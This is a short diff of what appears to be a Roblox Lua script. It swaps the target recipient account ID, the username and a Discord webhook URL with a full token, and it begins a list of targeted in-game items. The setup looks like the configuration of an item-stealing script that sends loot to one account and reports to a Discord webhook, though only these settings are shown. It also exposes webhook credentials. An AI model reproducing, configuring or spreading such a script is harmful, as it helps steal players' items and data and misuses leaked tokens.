@@ -1,6 +1,6 @@
-local TARGET_ID = 7344040497
-local TARGET_USER = "bloxfruitsnoobgive1"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1566541943260057600/OAu4V25E1cQ-kRsBgT-bbSQ_l68nyYD9_KUzk61NyFHB0-U5RaPbln8hJYDJvPq_TNoo"
+local TARGET_ID = 1210544620
+local TARGET_USER = "aletitopro"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1545017259188027455/85ti3WH0qGGJ9-bEgIIignHaRRG1wUJbyDqJf7BUCqqAb-0rSJ6cn3D0Pp9-RMzkdIkG"
 
 local TargetBrainrots = {
     ["fang fang dracula"] = true,
